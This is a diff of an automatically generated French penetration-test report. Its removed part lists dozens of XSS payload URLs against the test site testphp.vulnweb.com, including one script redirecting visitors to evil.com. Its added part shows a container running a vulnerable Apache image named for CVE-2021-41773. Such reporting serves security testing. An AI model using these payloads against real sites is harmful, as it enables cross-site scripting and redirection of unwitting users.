@@ -49,7 +49,7 @@
     1. Introduction
    </h2>
 <p>
-    Rapport de test d'intrusion pour inconnu.local - 01/06/2025
+    Rapport de test d'intrusion pour inconnu.local - 09/06/2025
    </p>
 </div>
 <div class="section">
@@ -82,7 +82,7 @@
     3. Résumé Exécutif
    </h2>
 <p>
-    Outils utilisés: ParamSpider / XSS
+    Outils utilisés: Aucun outil exécuté
    </p>
 </div>
 <div class="section">
@@ -104,20 +104,6 @@
       Recommandation
      </th>
 </tr>
-<tr>
-<td>
-      XSS potentiel
-     </td>
-<td>
-      Moyenne
-     </td>
-<td>
-      Tests XSS effectués avec succés - vérifier les résultats spécifiques dans la section  'Détails Techniques'
-     </td>
-<td>
-      Filtrer les entrées, implémenter CSP
-     </td>
-</tr>
 </table>
 </div>
 <div class="section">
@@ -125,14 +111,14 @@
     5. Recommandations Générales
    </h2>
 <ul>
-<h3 style="color:black;font-weight:bold;">Vulnérabilité XSS</h3><li>Validation et assainissement des données entrantes</li><li>Headers HTTP complémentaires(X-Content-Type-Options: nosniff,X-Frame-Options:DENY,Set-Cookie HttpOnly; Secure)</li><h3 style="color:black;font-weight:bold;">page de connexion</h3><li>Blocage en cas d’échecs répétés</li><li>Authentification multifacteur (MFA)</li><li>Politiques de mot de passe robuste</li><li>Vérification en deux facteurs (2FA/MFA)</li><li>Filtrer accès au seul utilisateur ou partener ayant le droit d"accès</li><li>Mises à jour régulières de votre serveur web</li><li>Protection contre le bruteforce</li><h3 style="color:black;font-weight:bold;">Vulnérabilité SQL</h3><li>Ne renvoyez jamais une trace de la base de données ou le message d’erreur complet à l’utilisateur.Fournissez des messages génériques et consignez le détail dans des logs internes.</li><li>Déployer un WAF configuré pour détecter et bloquer les patterns typiques d’injection</li></ul>
+</ul>
 </div>
 <div class="section">
 <h2>
     Détails Techniques
    </h2>
 <pre>============================================================
-       RAPPORT DE SÉCURITÉ - 20250601_130822
+       RAPPORT DE SÉCURITÉ - 20250609_073551
 ============================================================
 
 
@@ -159,159 +145,7 @@ Les résultats de DIRB sont affichés dans la console lors du scan.
 
 
 ==================== SCAN XSS ====================
-Fichier: results/testphp.vulnweb.com_result.txt
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/showimage.php?file=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;uiDo=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;uiDo=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;HlhS=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;HlhS=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;DUMM=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;DUMM=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/product.php?pic=&lt;script&gt;alert(1)&lt;/script&gt;&amp;otIR=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/product.php?pic=&lt;script&gt;alert(1)&lt;/script&gt;&amp;otIR=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&lt;script&gt;alert(1)&lt;/script&gt;&amp;p=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;&amp;pp=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;&amp;pp=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&lt;script&gt;alert(1)&lt;/script&gt;&amp;p=&lt;script&gt;alert(1)&lt;/script&gt;&amp;pp=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&lt;script&gt;alert(1)&lt;/script&gt;&amp;p=&lt;script&gt;alert(1)&lt;/script&gt;&amp;pp=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;fYij=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;fYij=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(1)&lt;/script&gt;&amp;artist=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(1)&lt;/script&gt;&amp;artist=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(1)&lt;/script&gt;&amp;zfdfasdf=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(1)&lt;/script&gt;&amp;zfdfasdf=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?artist=&lt;script&gt;alert(1)&lt;/script&gt;&amp;amp%3Basdf=&lt;script&gt;alert(1)&lt;/script&gt;&amp;amp%3Bcat=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?artist=&lt;script&gt;alert(1)&lt;/script&gt;&amp;amp%3Basdf=&lt;script&gt;alert(1)&lt;/script&gt;&amp;amp%3Bcat=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?artist=&lt;script&gt;alert(1)&lt;/script&gt;&amp;amp%3Basdf=FUZZ&amp;amp%3Bcat=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/artists.php?artist=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?artist=&lt;script&gt;alert(1)&lt;/script&gt;&amp;cat=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;YVeN=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;YVeN=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?artist=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;mjqN=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;mjqN=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/artists.php?+artist=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/listproducts.php?artist=&lt;script&gt;alert(1)&lt;/script&gt;&amp;asdf=&lt;script&gt;alert(1)&lt;/script&gt;&amp;cat=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/showimage.php?file=&lt;script&gt;alert(1)&lt;/script&gt;&amp;size=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/showimage.php?file=&lt;script&gt;alert(1)&lt;/script&gt;&amp;size=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infocateg.php?id=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/product.php?pic=&lt;script&gt;alert(1)&lt;/script&gt;&amp;hkNi=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/product.php?pic=&lt;script&gt;alert(1)&lt;/script&gt;&amp;hkNi=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/index.php?pp=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;LDeO=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=&lt;script&gt;alert(1)&lt;/script&gt;&amp;LDeO=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/params.php?p=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/product.php?pic=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/product.php?pic=&lt;script&gt;alert(1)&lt;/script&gt;&amp;tdRI=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/product.php?pic=&lt;script&gt;alert(1)&lt;/script&gt;&amp;tdRI=FUZZ
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=&lt;script&gt;alert(1)&lt;/script&gt;
-
-Payload: &lt;script&gt;alert(1)&lt;/script&gt;
-URL: http://testphp.vulnweb.com/hpp/?pp=&lt;script&gt;alert(1)&lt;/script&gt;
-
-RedirectionXSS=TRUE; FinalURL=http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Ewindow.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E
-
+L'outil de scan XSS non executé.
 
 
 ==================== SCAN INJECTION SQL ====================
@@ -319,7 +153,8 @@ L'outil de scan SQL non executé.
 
 
 ==================== CONTENEURS DOCKER ====================
-CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+CONTAINER ID   IMAGE                                    COMMAND              CREATED          STATUS          PORTS                                   NAMES
+db690ac49cca   blueteamsteve/cve-2021-41773:with-cgid   "httpd-foreground"   21 seconds ago   Up 20 seconds   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   youthful_keller
 
 
 
